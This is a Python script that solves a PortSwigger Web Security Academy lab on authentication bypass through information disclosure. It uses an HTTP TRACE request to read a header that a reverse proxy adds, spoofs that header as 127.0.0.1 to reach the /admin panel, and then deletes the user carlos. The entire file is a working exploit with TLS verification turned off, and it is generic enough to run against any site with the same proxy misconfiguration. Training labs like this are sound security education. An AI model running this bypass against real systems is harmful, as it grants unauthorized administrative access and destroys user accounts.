#!/usr/bin/env python3
"""
Authentication bypass via information disclosure
PortSwigger Web Security Academy -- Information Disclosure

Companion script for the writeup: 04-authentication-bypass.md

What this does:
    Sends TRACE /admin so the server echoes the exact request it received,
    including any header a reverse proxy added before forwarding it upstream.
    Scans the echoed body for X-* headers and preferentially picks ones whose
    name contains "ip", "forward", or "auth" -- the families reverse proxies
    typically use to pass along the client's real IP. Replays that header with
    the value spoofed to 127.0.0.1 against /admin, then follows the delete link
    for carlos found on the resulting admin panel, sending the same spoofed
    header again.

Usage:
    python 04-authentication-bypass.py <lab-url>
    e.g. python 04-authentication-bypass.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(verify=False, timeout=15, follow_redirects=True)

    tr = client.request("TRACE", f"{lab_url}/admin")
    print(f"[*] TRACE /admin: {tr.status_code}")
    if tr.status_code != 200:
        print("[-] TRACE method not working")
        return

    header_match = re.findall(r"(X-[\w-]+):\s*([^\r\n]+)", tr.text)
    if not header_match:
        print("[-] No custom headers found in TRACE echo")
        return

    for hname, hvalue in header_match:
        print(f"[+] Found header: {hname}: {hvalue}")

    custom_headers = {}
    for hname, _ in header_match:
        if "ip" in hname.lower() or "forward" in hname.lower() or "auth" in hname.lower():
            custom_headers[hname] = "127.0.0.1"

    if not custom_headers:
        custom_headers[header_match[0][0]] = "127.0.0.1"

    ar = client.get(f"{lab_url}/admin", headers=custom_headers)
    print(f"[*] Admin access: {ar.status_code}")
    if ar.status_code != 200 or "admin" not in ar.text.lower():
        print("[-] Admin panel not reachable with spoofed header")
        return

    print("[+] Admin panel accessed!")
    delete_match = re.search(r'href="(/admin/delete\?username=carlos)"', ar.text)
    if not delete_match:
        print("[-] No delete link for carlos found on admin panel")
        return

    dr = client.get(f"{lab_url}{delete_match.group(1)}", headers=custom_headers)
    if "Congratulations" in dr.text or dr.status_code == 200:
        print("[+] Lab solved! (carlos deleted)")
    else:
        print(f"[!] Delete request status: {dr.status_code}")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
